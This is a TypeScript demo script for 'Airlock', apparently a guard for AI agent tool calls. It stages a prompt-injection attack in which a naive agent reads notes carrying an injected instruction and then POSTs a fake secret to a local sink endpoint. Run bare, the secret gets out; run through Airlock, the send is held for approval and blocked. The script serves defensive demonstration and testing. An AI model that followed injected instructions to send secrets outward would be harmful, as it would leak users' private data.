#!/usr/bin/env node
/**
 * The killer demo. Runs the benign exfiltration scenario two ways:
 *
 *   1. UNSAFE: agent script talks directly to demo/mock-server.ts. The
 *      fake secret reaches the local sink.
 *   2. SAFE:   agent script talks through `airlock wrap`. The lethal-trifecta
 *      default policy holds the outbound POST for approval; the demo
 *      runner does not approve, so it times out, the secret never
 *      reaches the sink, and the whole chain is captured in the audit log.
 *
 * Run with:
 *   npm run demo:unsafe   # bare mock, secret reaches sink
 *   npm run demo:safe     # through airlock, sink stays empty
 *
 * The sink is an in-process HTTP server bound to 127.0.0.1:9099 that
 * records every POST body it receives. The script exits non-zero if the
 * outcome doesn't match expectations — so `npm test` could run this too.
 */

import http from "node:http";
import { spawn, type ChildProcessWithoutNullStreams } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { resolve, join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const FAKE_SECRET = "FAKE-SECRET-DO-NOT-USE-1234";
const SINK_PORT = 9099;

const __dirname = dirname(fileURLToPath(import.meta.url));
// __dirname is dist/demo/ at runtime → walk up to repo root.
const repoRoot = resolve(__dirname, "..", "..");

interface SinkHits {
  hits: Array<{ url: string; body: string }>;
  close: () => Promise<void>;
}

async function startSink(): Promise<SinkHits> {
  const hits: SinkHits["hits"] = [];
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c.toString("utf8")));
    req.on("end", () => {
      hits.push({ url: req.url ?? "", body });
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ received: true }));
    });
  });
  await new Promise<void>((res) => server.listen(SINK_PORT, "127.0.0.1", res));
  return {
    hits,
    close: () =>
      new Promise<void>((res, rej) =>
        server.close((err) => (err ? rej(err) : res())),
      ),
  };
}

interface MockClient {
  sendCall: (id: number, name: string, args: unknown) => Promise<unknown>;
  shutdown: () => Promise<void>;
}

function startMockClient(mockChild: ChildProcessWithoutNullStreams): MockClient {
  let seq = 0;
  void seq;
  const pendingByMsgId = new Map<number, (value: unknown) => void>();
  let buf = Buffer.alloc(0);
  mockChild.stdout.on("data", (chunk: Buffer) => {
    buf = buf.length === 0 ? chunk : Buffer.concat([buf, chunk]);
    while (true) {
      const i = buf.indexOf(0x0a);
      if (i === -1) return;
      const raw = buf.subarray(0, i).toString("utf8");
      buf = buf.subarray(i + 1);
      if (!raw) continue;
      try {
        const msg = JSON.parse(raw) as { id?: number };
        if (typeof msg.id === "number") {
          const resolver = pendingByMsgId.get(msg.id);
          if (resolver) {
            pendingByMsgId.delete(msg.id);
            resolver(msg);
          }
        }
      } catch {
        // skip malformed
      }
    }
  });
  return {
    sendCall: (id, name, args) =>
      new Promise<unknown>((resolveOne) => {
        pendingByMsgId.set(id, resolveOne);
        mockChild.stdin.write(
          JSON.stringify({
            jsonrpc: "2.0",
            id,
            method: "tools/call",
            params: { name, arguments: args },
          }) + "\n",
        );
      }),
    shutdown: async () => {
      mockChild.stdin.end();
      await new Promise<void>((res) => mockChild.on("exit", () => res()));
    },
  };
}

async function runScenario(opts: { useAirlock: boolean }): Promise<{
  hitsAfter: number;
  notesText: string;
  postResult: unknown;
}> {
  const sink = await startSink();
  let mockChild: ChildProcessWithoutNullStreams;
  if (opts.useAirlock) {
    mockChild = spawn(
      process.execPath,
      [
        join(repoRoot, "dist/cli.js"),
        "wrap",
        "--no-cli-approval",
        "--approval-timeout-ms",
        "1500",
        "--",
        process.execPath,
        join(repoRoot, "dist/demo/mock-server.js"),
      ],
      {
        stdio: ["pipe", "pipe", "inherit"],
        env: { ...process.env, AIRLOCK_NO_NOTIFY: "1" },
      },
    );
  } else {
    mockChild = spawn(
      process.execPath,
      [join(repoRoot, "dist/demo/mock-server.js")],
      {
        stdio: ["pipe", "pipe", "inherit"],
      },
    );
  }
  const client = startMockClient(mockChild);
  try {
    // Step 1: the agent reads notes (this is the *private read + untrusted
    // content* leg — notes contain an injected instruction).
    const readResponse = (await client.sendCall(1, "read_notes", { id: "1" })) as {
      result?: { content?: Array<{ text?: string }> };
      error?: { message?: string };
    };
    const notesText = readResponse?.result?.content?.[0]?.text ?? "";

    // Step 2: the (naive) agent follows the injected instruction and POSTs
    // the fake secret to the sink. With Airlock, this completes the lethal
    // trifecta (network/send after private read + untrusted content) and
    // gets held for approval, which we don't provide, so it times out.
    const postResult = (await client.sendCall(2, "http_post", {
      url: `http://127.0.0.1:${SINK_PORT}/collect`,
      body: { secret: FAKE_SECRET },
    })) as unknown;

    // Brief wait so any in-flight POST to the sink lands before we count.
    await new Promise((res) => setTimeout(res, 200));

    return { hitsAfter: sink.hits.length, notesText, postResult };
  } finally {
    await client.shutdown();
    await sink.close();
  }
}

async function main(): Promise<void> {
  const mode = process.argv[2];
  if (mode !== "unsafe" && mode !== "safe") {
    process.stderr.write("usage: attack-scenario.cjs unsafe|safe\n");
    process.exit(64);
  }
  const useAirlock = mode === "safe";

  if (useAirlock) {
    // Fresh, isolated AIRLOCK_HOME so a developer's real audit log isn't
    // touched by the demo.
    const tmp = mkdtempSync(resolve(tmpdir(), "airlock-demo-"));
    process.env.AIRLOCK_HOME = tmp;
    try {
      const result = await runScenario({ useAirlock: true });
      const banner = "═".repeat(72);
      console.log(banner);
      console.log("  airlock demo: SAFE run (through `airlock wrap`)");
      console.log(banner);
      console.log("  notes contained an injected instruction:");
      console.log("    ─────────────────────────────────────────────");
      for (const line of result.notesText.split("\n")) console.log(`    ${line}`);
      console.log("    ─────────────────────────────────────────────");
      console.log(`  agent attempted POST -> sink response: ${JSON.stringify(result.postResult)}`);
      console.log(`  sink received: ${result.hitsAfter} POSTs`);
      if (result.hitsAfter !== 0) {
        console.error("\nFAIL: secret reached the sink despite Airlock");
        process.exit(2);
      }
      console.log(`  audit log: $AIRLOCK_HOME=${tmp}/audit.log`);
      console.log("\nOK: lethal trifecta held; sink stayed empty.");
      console.log("    run `AIRLOCK_HOME=" + tmp + " node dist/cli.js log` to see the chain");
    } finally {
      // Do NOT delete tmp here — the audit log is the proof. The demo
      // README documents how to inspect it.
      void rmSync;
    }
    return;
  }

  const result = await runScenario({ useAirlock: false });
  const banner = "═".repeat(72);
  console.log(banner);
  console.log("  airlock demo: UNSAFE run (no airlock)");
  console.log(banner);
  console.log("  notes contained an injected instruction:");
  console.log("    ─────────────────────────────────────────────");
  for (const line of result.notesText.split("\n")) console.log(`    ${line}`);
  console.log("    ─────────────────────────────────────────────");
  console.log(`  agent attempted POST -> sink response: ${JSON.stringify(result.postResult)}`);
  console.log(`  sink received: ${result.hitsAfter} POSTs`);
  if (result.hitsAfter < 1) {
    console.error("\nFAIL: expected the secret to reach the sink in unsafe mode");
    process.exit(2);
  }
  console.log("\nThe fake secret reached the sink. This is what an unmitigated agent does.");
  console.log("Run `npm run demo:safe` to see Airlock hold the POST.");
}

main().catch((err) => {
  console.error("demo failed:", err);
  process.exit(1);
});
